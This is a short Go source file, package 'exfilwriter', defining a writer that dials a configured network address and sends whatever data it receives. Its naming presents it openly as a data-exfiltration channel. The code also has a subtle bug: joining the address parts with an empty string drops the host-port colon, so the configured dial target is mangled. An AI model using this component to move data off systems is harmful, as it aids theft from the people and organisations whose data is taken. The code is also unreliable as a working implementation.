package exfilwriter

import (
	"fmt"
	"net"
	"strings"
)

type dialExfiltrator struct {
	net     string
	address string
}

func newDialExfiltrator(cfg string) (*dialExfiltrator, error) {
	parts := strings.Split(cfg, ":")
	if len(parts) < 2 {
		return nil, fmt.Errorf("invalid config")
	}
	network := parts[0]
	address := strings.Join(parts[1:], "")

	return &dialExfiltrator{
		net:     network,
		address: address,
	}, nil
}

func (ex *dialExfiltrator) Write(data []byte) (int, error) {
	conn, err := net.Dial(ex.net, ex.address)
	if err != nil {
		return 0, fmt.Errorf("write to dial exfiltrator (%s/%s): %v", ex.net, ex.address, err)
	}

	defer conn.Close()

	return conn.Write(data)
}
